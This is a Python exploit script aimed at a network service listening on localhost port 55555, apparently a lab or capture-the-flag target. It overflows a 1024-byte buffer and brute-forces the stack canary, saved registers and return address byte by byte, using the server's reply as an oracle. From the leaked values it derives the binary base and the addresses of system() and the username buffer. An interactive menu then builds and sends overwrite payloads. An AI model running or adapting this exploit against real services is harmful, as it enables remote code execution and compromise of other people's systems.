#!/usr/bin/python3
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack


#Overflow the stack with some data,
#return True if the data is correct
#	- right stack cookie
#	- right return address

def p64(x):
    return pack("<Q", x)

RETURN_ADDRESS_OFFSET = 0x1537

def oracle(username=b'toto', data=b'', timeout=0.5):
	try:
		# Connect to the server
		connected = False
		# while not connected:
		# 	try:
		# 		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		# 		if timeout:
		# 			s.settimeout(timeout)
		# 		s.connect(('127.0.0.1',55555))
		# 		connected = True
		# 	except:
		# 		continue
		
		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		if timeout:
			s.settimeout(timeout)
		s.connect(('127.0.0.1',55555))
		# connected = True	
		# Do hello
		s.send(pack("<H", 0));
		s.send(username);
		hello = s.recv(100);
		# print ("Server Hello: %s"%hello.decode())

		# Do ping-pong
		s.send(pack("<H", 1));
		
		buf = (b'A' * (1024))
		buf += data
		# 0x7fffffffccf0
		# user_input = input("Enter data to send (hex): ")
		
		s.send(pack("<H", len(buf)));
		s.send(buf)
		rep = s.recv(len(buf));
		# print ("Server pong : %s"%repr(rep))

		if rep != buf:
			print ("Bad pong reply")
			return False

		s.send(pack("<H", 2));
		bye = s.recv(100);
		# print("Server bye : %s"%bye.decode())
		if bye != b'Bye toto': 
			print("I am here")
			return False

		# Close connection
		s.close()
	except :
		# print ("Network Exception")
		return False

	return True

def bruteforce_stack(size, i):
    data = b''
    while len(data) < size:
        found = False
        i = 0
        for b in range(256):
           
            send_data = data + bytes((b,))
            # print("tried data: %s" % (hexlify(bytes((b,))))) 
            if oracle(data=send_data):
                data = send_data
                found = True
                break
            i += 1
        assert found == True
        print("Data: %s byte value: %i", data, i)
    return data
    
def main():

    print("=== Initial setup ===")

    print("1. Run stack leak")

    print("2. Enter custom payload")

    setup = input("> ").strip()

    raw_payload = None

    if setup == "1":

        # Get initial values from the stack leak

        raw = bruteforce_stack(24, 0)

        canary, ebx, esi, ebp, return_addr, fd = unpack(

            "<IIIIII", raw

        )

        binary_base = return_addr - RETURN_ADDRESS_OFFSET

        system_addr = binary_base + 0x15f2

        username_addr = binary_base + 0x4040

        print("\n=== Initial values ===")

        print(f"canary       = {canary:#010x}")

        print(f"ebx          = {ebx:#010x}")

        print(f"esi          = {esi:#010x}")

        print(f"ebp          = {ebp:#010x}")

        print(f"return_addr  = {return_addr:#010x}")

        print(f"fd           = {fd:#010x}")

        print(f"binary_base  = {binary_base:#010x}")

        print(f"system       = {system_addr:#010x}")

        print(f"username     = {username_addr:#010x}")

    elif setup == "2":

        print("\nEnter custom payload as hexadecimal:")

        value = input("> ").strip()

        try:

            raw_payload = unhexlify(value)

        except ValueError:

            print("Invalid hexadecimal payload.")

            return

        print(f"\nCustom payload loaded ({len(raw_payload)} bytes).")

        print("payload:", hexlify(raw_payload).decode())

        # These don't exist because we didn't run the leak.

        canary = None

        ebx = None

        esi = None

        ebp = None

        return_addr = None

        fd = None

        binary_base = None

        system_addr = None

        username_addr = None

    else:

        print("Unknown option.")

        return

    while True:

        print("\n=== Menu ===")

        print("1. Show current payload")

        print("2. Modify structured payload")

        print("3. Send payload")

        print("4. Re-run stack leak")

        print("5. Enter custom raw payload")

        print("q. Quit")

        choice = input("> ").strip()

        if choice == "q":

            break

        elif choice == "1":

            if raw_payload is not None:

                data = raw_payload

                print("payload mode: CUSTOM")

            else:

                data = pack(

                    "<IIIIII",

                    canary,

                    ebx,

                    esi,

                    ebp,

                    return_addr,

                    fd

                )

                print("payload mode: STRUCTURED")

            print("payload:", hexlify(data).decode())

        elif choice == "2":

            if raw_payload is not None:

                print("Currently using a custom payload.")

                print("Modify structured fields only after running a stack leak.")

                continue

            print("\nEnter a field to modify:")

            print("canary")

            print("ebx")

            print("esi")

            print("ebp")

            print("return_addr")

            print("fd")

            field = input("> ").strip()

            if field not in {

                "canary",

                "ebx",

                "esi",

                "ebp",

                "return_addr",

                "fd"

            }:

                print("Unknown field.")

                continue

            value = input("New value (hex): ").strip()

            try:

                value = int(value, 16)

            except ValueError:

                print("Invalid hexadecimal value.")

                continue

            if field == "canary":

                canary = value

            elif field == "ebx":

                ebx = value

            elif field == "esi":

                esi = value

            elif field == "ebp":

                ebp = value

            elif field == "return_addr":

                return_addr = value

            elif field == "fd":

                fd = value

            print(f"{field} = {value:#010x}")

        elif choice == "3":

            username = input("username: ").encode()

            if raw_payload is not None:

                data = raw_payload

            else:

                data = pack(

                    "<IIIIII",

                    canary,

                    ebx,

                    esi,

                    ebp,

                    return_addr,

                    fd

                )

            print("payload:", hexlify(data).decode())

            print(oracle(username=username, data=data))

        elif choice == "4":

            raw = bruteforce_stack(24, 0)

            canary, ebx, esi, ebp, return_addr, fd = unpack(

                "<IIIIII", raw

            )

            binary_base = return_addr - RETURN_ADDRESS_OFFSET

            system_addr = binary_base + 0x15f2

            username_addr = binary_base + 0x4040

            # Stack leak gives us a fresh structured payload

            raw_payload = None

            print("\n=== Stack leak updated ===")

            print(f"canary       = {canary:#010x}")

            print(f"ebx          = {ebx:#010x}")

            print(f"esi          = {esi:#010x}")

            print(f"ebp          = {ebp:#010x}")

            print(f"return_addr  = {return_addr:#010x}")

            print(f"fd           = {fd:#010x}")

            print(f"binary_base  = {binary_base:#010x}")

            print(f"system       = {system_addr:#010x}")

            print(f"username     = {username_addr:#010x}")

        elif choice == "5":

            print("\nEnter custom payload as hexadecimal:")

            value = input("> ").strip()

            try:

                raw_payload = unhexlify(value)

            except ValueError:

                print("Invalid hexadecimal payload.")

                continue

            print(f"Custom payload set ({len(raw_payload)} bytes).")

            print("payload:", hexlify(raw_payload).decode())

        else:

            print("Unknown option.")
   
if __name__ == '__main__': main()








